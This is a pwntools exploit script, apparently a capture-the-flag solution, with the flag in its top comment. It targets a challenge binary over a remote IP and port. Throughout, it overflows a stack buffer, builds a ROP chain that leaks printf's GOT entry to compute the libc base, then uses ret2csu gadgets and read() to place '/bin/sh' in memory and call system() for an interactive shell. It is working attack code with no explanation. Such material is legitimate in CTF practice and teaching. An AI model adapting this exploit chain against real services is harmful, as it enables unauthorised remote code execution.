# ASCIS{syscall_g00d_int_0x80_b3st}

from pwn import *

debug = 0

if(debug):
	r = process("./chall")
	printf_off = 0x61cc0
	system_off = 0x522c0
else:
	r = remote("34.143.130.87", 4097)
	printf_off = 0x61c90
	system_off = 0x52290

r.recvuntil(b'> ')

bss = 0x00404500
ret= 0x000000000040101a
pop_rdi_ret = 0x401523
puts_func = 0x4010e0
printf_got = 0x0000000000403fa8
main = 0x0000000000401397
puts_got = 0x403f98
read_ = 0x401110
win = 0x0000000000401276
pop_rsi_pop_ret = 0x401521
csu_low = 0x40151a
csu_high = 0x401500

random_number = b'\x11\x11\x11\x11'

payload = b"a"*5*8 + b"aaaa" + random_number + b'a'*8 
payload += p64(pop_rdi_ret) + p64(printf_got) + p64(puts_func)
payload += p64(main)

r.sendline(payload)


# guess secret
r.recvuntil(b'> ')
#gdb.attach(r)
r.sendline(b'286331153')
data = r.recvuntil(b'\x7f')[-6:]
data = int.from_bytes(data, 'little')

libc_base = data - printf_off
print(hex(libc_base))

# back to main
system = libc_base + system_off
payload = b"a"*5*8 + b"aaaa" + random_number + b'a'*8 

payload += p64(csu_low) + p64(0) + p64(1) + p64(1) + p64(0) + p64(0x30) + p64(0x403d80)
payload += p64(csu_high) + p64(0)*7
payload += p64(pop_rdi_ret) + p64(0) 
payload += p64(pop_rsi_pop_ret) + p64(bss) + p64(0)
payload += p64(read_)
payload += p64(pop_rdi_ret) + p64(bss)
payload += p64(system) 

r.sendline(payload)
r.recvuntil(b'> ')
r.sendline(b'286331153')

payload = b'/bin/sh'
r.sendline(payload)


r.interactive()

